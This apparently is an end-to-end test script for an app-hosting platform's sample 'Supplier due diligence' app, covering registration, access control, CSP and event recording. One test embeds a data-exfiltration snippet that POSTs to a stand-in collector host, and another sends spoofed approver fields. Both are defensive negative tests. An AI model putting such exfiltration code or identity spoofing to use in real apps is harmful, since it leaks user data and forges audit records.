#!/usr/bin/env node
// M9 check on the running stack (exit criterion): the sample app "Supplier due diligence" is built only on the
// generated app SDK, registered with an owner, its actions and an expiry, checked statically (a leaky variant is
// rejected), activated, served by the app host on its own origin, and a person submits a due-diligence statement
// through it — recorded as an event with the person and the app as actors. Access needs the role on the app; API calls
// are limited to the app's registered actions and classes; caller fields from the browser are dropped; a disabled app
// answers 410. The ontology change the app needs (class DueDiligenceStatement, two actions) goes through a reviewed
// pull request first, like any other change (M8).
import { mkdirSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { ADMIN, HUMANS, PASSWORD, Session, env, log, root, sleep, until } from '../sofa-company/lib.mjs';
import { registerApp } from './app-register.mjs';
import { docker, gitHost, policyConverged, sql } from './lib.mjs';

const args = new Set(process.argv.slice(2));
const result = { startedAt: new Date().toISOString(), checks: [] };
const check = (name, ok, detail) => {
  result.checks.push({ name, ok: !!ok, detail });
  log(`${ok ? 'ok  ' : 'FAIL'} ${name}${detail !== undefined ? ` — ${typeof detail === 'string' ? detail : JSON.stringify(detail)}` : ''}`);
  if (!ok) throw new Error(`check failed: ${name}`);
};
const s = new Session();
const api = (method, p, body) => s.json(method, `${ADMIN}/api${p}`, body);
const APPS = `http://${env.PUBLIC_HOST || 'localhost'}:8090`;
const APP_ID = 'supplier-due-diligence';
const APP = `${APPS}/apps/${APP_ID}`;
const STEFAN = HUMANS.stefan;
const NL = String.fromCharCode(10);

const forge = (method, p, body) => gitHost().call(method, p, body);
const file = async (p) => (await api('GET', `/liquid/config/file?path=${p}`)).content;
const bump = (v) => {
  const [a, b] = v.split('.').map(Number);
  return `${a}.${b + 1}.0`;
};

/** The ontology change of the sample app (minor): a class, an event, two actions, the role to write it. */
async function ensureDueDiligenceOntology() {
  const live = await api('GET', '/liquid/ontology');
  if (live.classes.some((c) => c.name === 'DueDiligenceStatement')) return { version: live.version, proposed: false };
  const v1 = bump(live.version);
  const schema = (await file('ontology/sofa/schema.yaml'))
    .replace(/^version: .*$/m, `version: ${v1}`)
    .replace(
      /\nclasses:\n/,
      [
        '',
        'classes:',
        '  DueDiligenceStatement:',
        "    description: A supplier's due-diligence statement (sanctions screening, conflict minerals, labour standards), recorded by a buyer in the due-diligence app (M9).",
        '    annotations: { criticality: business_critical, data_class: confidential, owner: head-of-logistics }',
        '    attributes:',
        '      id: { identifier: true, description: e.g. DDS-001 }',
        '      supplier: { range: Supplier, required: true, description: The supplier the statement is about }',
        '      statement: { required: true, description: What the supplier declares }',
        '      sanctions_checked: { range: boolean, description: The supplier was screened against the sanctions lists }',
        '      signed_by: { required: true, description: Name of the person who signs the statement }',
        '',
        '',
      ].join(NL),
    );
  const actions = (await file('ontology/sofa/actions.yaml'))
    .replace(/(\n {2}- \{ name: PurchaseOrderReleased[^\n]*\n)/, `$1  - { name: DueDiligenceStatementSubmitted, object_type: DueDiligenceStatement, description: A due-diligence statement of a supplier was recorded }${NL}`)
    .concat(
      [
        '  - name: submit_due_diligence_statement',
        '    target: DueDiligenceStatement',
        '    kind: create',
        "    description: WRITE. Record a supplier's due-diligence statement (used by the due-diligence app).",
        '    input:',
        '      supplierId: { range: Supplier, required: true, description: Supplier id }',
        '      statement: { range: string, required: true, description: What the supplier declares }',
        '      sanctionsChecked: { range: boolean, description: Screened against the sanctions lists }',
        '      signedBy: { range: string, required: true, description: Name of the person who signs }',
        '    emits: [DueDiligenceStatementSubmitted]',
        '  - name: list_due_diligence_statements',
        '    target: DueDiligenceStatement',
        '    kind: query',
        '    read_only: true',
        '    description: Due-diligence statements of suppliers.',
        '    input:',
        '      supplierId: { range: Supplier, description: Filter by supplier }',
        '',
      ].join(NL),
    );
  const roles = JSON.parse(await file('policies/liquid/roles/data.json'));
  roles.roles.procurement.writes = [...new Set([...roles.roles.procurement.writes, 'submit_due_diligence_statement'])];
  const rev0 = (await api('GET', '/liquid/policy')).bundle?.revision;
  const p = await api('POST', '/liquid/proposals', {
    title: 'Due-diligence statements of suppliers (M9 sample app)',
    reason: 'Buyers record suppliers’ due-diligence statements in a small app; the statement must be an ontology object written by an action.',
    changes: [
      { path: 'ontology/sofa/schema.yaml', content: schema },
      { path: 'ontology/sofa/actions.yaml', content: actions },
      { path: 'policies/liquid/roles/data.json', content: JSON.stringify(roles, null, 2) + NL },
    ],
  });
  if (!p.validation.ok) throw new Error(`the due-diligence proposal is invalid: ${JSON.stringify(p.validation.checks.filter((c) => !c.ok))}`);
  await forge('POST', `/repos/liquid/config/pulls/${p.pr.number}/reviews`, { event: 'APPROVED', body: 'ok (e2e apps)' });
  await forge('POST', `/repos/liquid/config/pulls/${p.pr.number}/merge`, { Do: 'merge', merge_message_field: `${p.title} (proposal ${p.id})` });
  await until('due-diligence ontology live', async () => ((await api('GET', '/liquid/ontology')).version === v1 ? true : undefined), 120_000, 2000);
  // the policy engines learn the new actions with the next package; until then unknown actions are denied (fail closed)
  await policyConverged(api, rev0);
  return { version: v1, proposed: true, compat: p.compat?.level };
}

/** A request from the app's own page (the SDK sends the header; the browser sends the Referer). */
const fromApp = (session, method, p, body, headers = { 'x-liquid-app': '1', referer: `${APP}/` }) =>
  session.raw(`${APP}/api${p}`, { method, headers: { ...headers, ...(body ? { 'content-type': 'application/json' } : {}) }, body: body ? JSON.stringify(body) : undefined });

try {
  await s.signIn(ADMIN, env.BOOTSTRAP_ADMIN_EMAIL, env.BOOTSTRAP_ADMIN_PASSWORD);
  const health = await fetch(`${APPS}/health`).then((r) => r.status).catch((e) => String(e));
  check('the app host listens on its own origin (port 8090)', health === 200, health);

  const onto = await ensureDueDiligenceOntology();
  check('the ontology the app needs is live (reviewed pull request, minor change)', true, onto);

  // a leaky variant is rejected by the registration check
  const leaky = await registerApp(s, { dir: 'apps/liquid-app-due-diligence', id: 'dd-leaky', name: 'Leaky variant (e2e)', owner: STEFAN.email, actions: ['submit_due_diligence_statement'], reads: ['Supplier'], extraFiles: { 'src/leak.ts': Buffer.from("export const leak = (x: unknown) => fetch('https://collector.example/x', { method: 'POST', body: JSON.stringify(x) });\n").toString('base64') } });
  const leakErrors = leaky.checks.flatMap((c) => c.errors ?? []);
  check('an app that sends data to another host is rejected (static check)', leaky.status === 'rejected' && leakErrors.some((e) => /src\/leak\.ts: fetch/.test(e)), leakErrors);
  const leakyAct = await api('POST', '/liquid/apps/dd-leaky/activate').then(() => 'activated', (e) => String(e));
  check('a rejected app cannot be activated', /409/.test(leakyAct), leakyAct.slice(0, 120));

  // the sample app: register (SDK downloaded, built), check, activate
  const reg = await registerApp(s, { dir: 'apps/liquid-app-due-diligence', id: APP_ID, name: 'Supplier due diligence', owner: STEFAN.email, description: 'Buyers record the due-diligence statements of suppliers.', actions: ['submit_due_diligence_statement'], reads: ['Supplier', 'DueDiligenceStatement'] });
  const days = Math.round((Date.parse(reg.expiresAt) - Date.now()) / 86_400_000);
  check('the sample app passes every check (layout, pinned dependencies, only the SDK, actions, bundle)', reg.status === 'registered' && reg.checks.every((c) => c.ok), reg.checks.map((c) => `${c.name}=${c.ok}`));
  check('registered with owner and expiry (default 180 days)', reg.owner === STEFAN.email && days >= 179 && days <= 180, { owner: reg.owner, expiresAt: reg.expiresAt });
  const before = await fetch(`${APP}/`, { redirect: 'manual' });
  check('before activation the app host answers 410', before.status === 410, before.status);
  const act = await api('POST', `/liquid/apps/${APP_ID}/activate`);
  check('activation: active, listed with its expiry', act.status === 'active' && (await api('GET', '/liquid/apps')).some((a) => a.id === APP_ID && a.status === 'active' && a.expiresAt === reg.expiresAt), act.url);

  // access needs the role on the app
  const anon = await fetch(`${APP}/`, { redirect: 'manual' });
  check('anonymous: redirected to the app’s own sign-in', anon.status === 302 && anon.headers.get('location') === `/apps/${APP_ID}/auth/login?returnTo=%2Fapps%2F${APP_ID}%2F`, anon.headers.get('location'));
  const access0 = await api('GET', `/liquid/apps/${APP_ID}/access`);
  const stefanUser = access0.find((u) => u.email === STEFAN.email);
  await api('PUT', `/liquid/apps/${APP_ID}/access/${stefanUser.id}`, { allowed: false });
  const denied = await new Session().signIn(APP, STEFAN.email, PASSWORD).then(() => 'signed in', (e) => String(e));
  check('without the role on the app, sign-in is refused (by the OAuth server, before the app sees anyone)', /do not have access to App: Supplier due diligence/.test(denied), denied.replace(/^.*: /, '').slice(0, 120));
  await api('PUT', `/liquid/apps/${APP_ID}/access/${stefanUser.id}`, { allowed: true });
  const st = new Session();
  await st.signIn(APP, STEFAN.email, PASSWORD);
  const index = await st.raw(`${APP}/`);
  const html = await index.text();
  check('with the role: the app loads, with the strict CSP of the app host', index.status === 200 && /Supplier due diligence/.test(html) && /connect-src 'self'/.test(index.headers.get('content-security-policy') ?? ''), index.headers.get('content-security-policy'));

  // the API: own pages only, registered actions and classes only
  const me = await (await fromApp(st, 'GET', '/me')).json();
  check('the SDK sees who is signed in', me.upn === STEFAN.email && me.app === APP_ID, me);
  const noRef = await fromApp(st, 'GET', '/objects/Supplier', undefined, { 'x-liquid-app': '1' });
  const otherRef = await fromApp(st, 'GET', '/objects/Supplier', undefined, { 'x-liquid-app': '1', referer: `${APPS}/apps/dd-leaky/` });
  check('API calls must come from the app’s own pages (header + Referer)', noRef.status === 403 && otherRef.status === 403, { noReferer: noRef.status, otherApp: otherRef.status });
  const suppliers = await (await fromApp(st, 'GET', '/objects/Supplier')).json();
  const po = await fromApp(st, 'GET', '/objects/PurchaseOrder');
  const write = await fromApp(st, 'POST', '/actions/create_purchase_order', { supplierId: 'S-BALTIC', sku: 'BEAM-PINE-80', quantity: 1 });
  check('reads and actions outside the registration are refused', Array.isArray(suppliers) && suppliers.length > 0 && po.status === 403 && write.status === 403, { suppliers: suppliers.length, purchaseOrders: po.status, createPurchaseOrder: write.status });

  // the statement: an action of the person through the app, an event with both as actors
  const seq0 = Number(sql('SELECT coalesce(max(seq),0) FROM events'));
  const sub = await fromApp(st, 'POST', '/actions/submit_due_diligence_statement', { supplierId: 'S-BALTIC', statement: 'No conflict minerals; ILO core labour standards met; audit 2026 on file. (e2e)', sanctionsChecked: true, signedBy: STEFAN.name, _approvedBy: 'someone-else@example', _requestedBy: 'spoofed@example', _agent: 'sofa-lara' });
  const subBody = await sub.json();
  check('the person submits a statement through the app', sub.status === 200 && subBody.ok && subBody.seq > seq0, subBody);
  const ev = sql(`SELECT type || '|' || coalesce(actor_user,'') || '|' || coalesce(actor_agent,'') || '|' || coalesce(payload->>'app','') || '|' || coalesce(payload->>'approvedBy','-') FROM events WHERE seq = ${subBody.seq}`);
  check('the event has the person and the app as actors; caller fields from the browser were dropped', ev === `DueDiligenceStatementSubmitted|${STEFAN.email}||${APP_ID}|-`, ev);
  const statements = await (await fromApp(st, 'GET', '/objects/DueDiligenceStatement')).json();
  check('the statement is an object of the ontology (projection)', statements.some((x) => x.supplier === 'S-BALTIC' && x.signed_by === STEFAN.name && x.sanctions_checked === true), statements.length);

  if (args.has('--shots')) {
    const { Shots } = await import('../sofa-company/shots.mjs');
    process.env.ADMIN_EMAIL = env.BOOTSTRAP_ADMIN_EMAIL;
    process.env.ADMIN_PASSWORD = env.BOOTSTRAP_ADMIN_PASSWORD;
    const shots = await new Shots(path.join(root, 'docs', 'images', 'liquid')).open();
    await shots.snap(env.BOOTSTRAP_ADMIN_EMAIL, `${ADMIN}/liquid/apps`, 'liquid-apps', { width: 1500, height: 900, wait: 3000, fullPage: true });
    await shots.snap(STEFAN.email, `${APP}/`, 'liquid-app-due-diligence', { width: 1200, height: 900, wait: 3000, fullPage: true });
    await shots.close();
    log('screenshots: docs/images/liquid/liquid-apps.png, liquid-app-due-diligence.png');
  }

  // disable → 410 and no sign-in; activate again (the sample stays available)
  await api('POST', `/liquid/apps/${APP_ID}/disable`, { note: 'e2e' });
  const off = await st.raw(`${APP}/`);
  check('a disabled app answers 410, also for a signed-in person (its OIDC client is gone)', off.status === 410, off.status);
  await api('POST', `/liquid/apps/${APP_ID}/activate`);
  const back = await new Session().signIn(APP, STEFAN.email, PASSWORD).then(() => 'ok', (e) => String(e));
  check('activated again: sign-in works with a new client secret', back === 'ok', back);
  const events = sql(`SELECT string_agg(type, ',' ORDER BY seq) FROM events WHERE object_type = 'App' AND object_id = '${APP_ID}' AND seq > ${seq0}`);
  check('registry changes are events (App)', /AppDisabled.*AppActivated/.test(events), events);
  result.ok = true;
} catch (err) {
  result.ok = false;
  result.error = String(err);
  log(String(err));
} finally {
  result.finishedAt = new Date().toISOString();
  mkdirSync(path.join(root, 'scripts/liquid/results'), { recursive: true });
  writeFileSync(path.join(root, 'scripts/liquid/results/m9-apps-e2e.json'), JSON.stringify(result, null, 2));
  log(`${result.checks.filter((c) => c.ok).length}/${result.checks.length} checks ok`);
  process.exit(result.ok ? 0 : 1);
}
